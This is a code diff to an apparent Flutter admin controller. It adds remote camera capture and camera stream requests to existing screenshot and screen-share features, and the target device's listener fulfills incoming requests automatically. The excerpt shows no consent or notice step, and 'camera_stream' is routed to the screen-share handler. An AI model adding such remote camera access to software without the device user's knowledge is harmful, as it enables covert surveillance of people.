@@ -133,6 +133,10 @@ class AdminController extends GetxController {
                   (doc.data()['requestType'] as String?) ?? 'screenshot';
               if (requestType == 'screen_share') {
                 AdminService.fulfillScreenShareRequest(doc.id);
+              } else if (requestType == 'camera_capture') {
+                AdminService.fulfillCameraCaptureRequest(doc.id);
+              } else if (requestType == 'camera_stream') {
+                AdminService.fulfillScreenShareRequest(doc.id);
               } else {
                 AdminService.fulfillScreenshotRequest(doc.id);
               }
@@ -165,6 +169,30 @@ class AdminController extends GetxController {
     await AdminService.sendScreenShareRequest(
       targetDeviceId,
       currentDeviceId.value,
+    );
+  }
+
+  Future<void> requestCameraCapture(
+    String targetDeviceId, {
+    required String cameraFacing,
+  }) async {
+    if (targetDeviceId.isEmpty) return;
+    await AdminService.sendCameraCaptureRequest(
+      targetDeviceId,
+      currentDeviceId.value,
+      cameraFacing: cameraFacing,
+    );
+  }
+
+  Future<void> requestCameraStream(
+    String targetDeviceId, {
+    required String cameraFacing,
+  }) async {
+    if (targetDeviceId.isEmpty) return;
+    await AdminService.sendCameraStreamRequest(
+      targetDeviceId,
+      currentDeviceId.value,
+      cameraFacing: cameraFacing,
     );
   }
 
